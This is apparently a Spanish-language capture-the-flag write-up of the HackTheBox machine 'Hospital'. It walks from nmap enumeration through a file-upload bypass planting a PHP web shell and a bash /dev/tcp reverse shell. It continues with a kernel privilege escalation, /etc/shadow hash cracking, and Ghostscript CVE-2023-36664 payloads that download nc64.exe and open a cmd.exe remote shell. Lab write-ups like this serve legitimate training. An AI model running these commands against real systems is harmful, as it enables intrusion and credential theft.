#windows #fuzzing #medium 
### Ping
```python
ping -c 1 10.10.11.241
PING 10.10.11.241 (10.10.11.241) 56(84) bytes of data.
64 bytes from 10.10.11.241: icmp_seq=1 ttl=127 time=77.1 ms

--- 10.10.11.241 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 77.090/77.090/77.090/0.000 ms
```

### TTL 127= Windows 

### nmap
```python
PORT     STATE SERVICE           VERSION
22/tcp   open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-04-12 22:03:50Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp  open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp open  msmq?
2103/tcp open  msrpc             Microsoft Windows RPC
2105/tcp open  msrpc             Microsoft Windows RPC
2107/tcp open  msrpc             Microsoft Windows RPC
2179/tcp open  vmrdp?
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2024-04-12T22:04:46+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2024-04-11T16:53:57
|_Not valid after:  2024-10-11T16:53:57
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp open  msrpc             Microsoft Windows RPC
6406/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp open  msrpc             Microsoft Windows RPC
6410/tcp open  msrpc             Microsoft Windows RPC
6617/tcp open  msrpc             Microsoft Windows RPC
6631/tcp open  msrpc             Microsoft Windows RPC
6645/tcp open  msrpc             Microsoft Windows RPC
8080/tcp open  http              Apache httpd 2.4.55 ((Ubuntu))
| http-title: Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp open  mc-nmf            .NET Message Framing
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6h58m48s, deviation: 0s, median: 6h58m47s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-04-12T22:04:47
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 129.81 seconds
```

### Enumeración del puerto 53 (Domain)
`dig`
![[Pasted image 20240612121218.png]]

`dnsrecon -d hospital.htb -a -n 10.10.11.241`
![[Pasted image 20240612121223.png]]

### Enumeración del puerto 88 (Kerberos)
por el momento solo tenemos un usuario valido. administrator
![[Pasted image 20240612121228.png]]

### impacket-GetNPUsers
intentamos obtener un `TGT` pero el usuario no tiene `UF_DONT_REQUIRE_PREAUTH` por lo cual no podremos obtener un `TGT`
![[Pasted image 20240612121232.png]]

### Enumeración del puerto 8080 (http)
después de intentar un usuario inexistente nos envía a una pagina para crear un usuario 
![[Pasted image 20240612121237.png]]

![[Pasted image 20240612121242.png]]


`iniciamos session`
encontramos una web que nos permite subir archivos en este caso imagenes
![[Pasted image 20240612121253.png]]

usaremos el repositorio [github](https://github.com/flozz/p0wny-shell?source=post_page-----ce86940a895f--------------------------------) para cargar una shell de navegador. para ello debemos cambiar el nombre del archivo de .php a png luego vamos a interceptar esta peticion con burpsuite 
![[Pasted image 20240612121303.png]]

cambiamos la extensión del archivo shell.png a shell.phar y modificamos el `content-Tyoe` para que sea un application/x-php
![[Pasted image 20240612121311.png]]

ok. parece que ha aceptado el archivo. ahora solo debemos buscar el directorio donde se esta guardando. para ello haremos fuzzing
![[Pasted image 20240612121319.png]]
los archivos que subimos se guardan en un directorio llamado uploads. asi que apuntaremos a ese archivo en la url `10.10.11.241:8080/uploads/shell.phar`

de esta manera obtenemos una shell que nos permite interactuar de manera mas facil con el sistema. y aprovechando esto usaremos el comando `bash -c "bash -i >& /dev/tcp/10.10.14.137/9001 0>&1"` para obtener una reverse shell mas estable
![[Pasted image 20240612121325.png]]

### Reverse shell
obtenemos conexión y somos el usuario www-data
![[Pasted image 20240612121332.png]]

obtenemos la versión del sistema el cual es `ubuntu 23.04` investigando en internet conseguimos un exploit para la versión 23.04 que nos permite escalar privilegios usaremos este repo [github](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629.git)  
![[Pasted image 20240612121339.png]]

hacemos un git clone para descargar el repo y tenemos el exploit
![[Pasted image 20240612121344.png]]

### servirdor en python
creamos un servidor para poder compartir el exploit
![[Pasted image 20240612121352.png]]

en la maquina victima descargamos el exploit
![[Pasted image 20240612121359.png]]

le damos permisos de ejecución y lo ejecutamos 
![[Pasted image 20240612121405.png]]

### /etc/shadow
podemos leer el archivo shadow
![[Pasted image 20240612121411.png]]

en el directorio home tenemos al usuario `drwilliams` asi que primero apuntaremos al hash de este usuario
`hashcat -a 0 -m 1800 hash /usr/share/wordlists/rockyou.txt`
![[Pasted image 20240612121416.png]]

obtenemos la contraseña
![[Pasted image 20240612121422.png]]

### Puerto 80 https 
usaremos las credenciales en la web
![[Pasted image 20240612121427.png]]

### mail 
Inició sesión en el sitio web es exitoso. Después de examinar el correo de la bandeja de entrada, parece que solo acepta el formato de archivo .esp.
después de buscar en internet encontramos un exploit [github](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection.git) 
![[Pasted image 20240612121435.png]]

### Ghostscript
para esto tambien necesitaremos el binario de nc64.exe que podemos bajar de github. con el primer comando vamos a cargar el binario nc64.exe al correo electronico. y con el segundo comando vamos a ejecutar el binario. todo esto es posible a que el correo esta ejecutando codigo por detras gracias al exploit 
```python
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.81:8000/nc64.exe -o nc.exe" --filename file.eps


python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.81 4444 -e cmd.exe" --filename file.eps
```

![[Pasted image 20240612121447.png]]

### Escalada de privilegios
una ves estamos dentro de la maquina podemos ejecutar el script `ghostscript.bat` para obtener las credenciales de `drbrown` 

![[Pasted image 20240612121454.png]]
### rpcclient
utilizando las credenciales de `drbronw` podemos enumerar y ver que la información del usuario administrator se esta compartiendo 
![[Pasted image 20240612121513.png]]

### xampp
dado el caso tenemos acceso al directorio xampp por lo cual vamos a recuperar el github antes usando para subirlo aqui y de esta manera poder llamarlo desde la web principal 
![[Pasted image 20240612121518.png]]

### nt authority-system
de esta manera obtenemos acceso como nt authority - system. si quieres obtener una shell mas estable puedes repetir los pasos anteriores
![[Pasted image 20240612121524.png]]

### WE ARE ROOT